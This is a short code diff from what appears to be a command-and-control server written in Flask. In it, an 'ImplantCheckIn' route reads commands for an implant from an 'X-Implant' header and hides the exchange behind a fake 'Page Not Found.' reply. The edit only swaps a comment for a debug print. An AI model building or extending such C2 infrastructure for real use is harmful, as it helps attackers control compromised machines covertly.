@@ -38,12 +38,12 @@ def Stager():
 
 @app.route("/index", methods=['GET', 'POST'])
 def ImplantCheckIn():
-    # Should check ANY connection in against all configured implant options (IE body, header etc)
-    #   unlike they 'headers' options which is configured in the current iteration.
+    #
     if 'X-Implant' in request.headers:
         # Debugging:
         # print("Check in: {}".format( app.config['listener_type']))
         cmd_to_execute = Imp.IssueCommand(request.headers['X-Implant'], app.config['listener_type'])
+        print(cmd_to_execute, type(cmd_to_execute))
         response = make_response("Page Not Found.")
         # if cmd_to_execute !="==":
         #     print("ImplantCheckIn: ",cmd_to_execute)
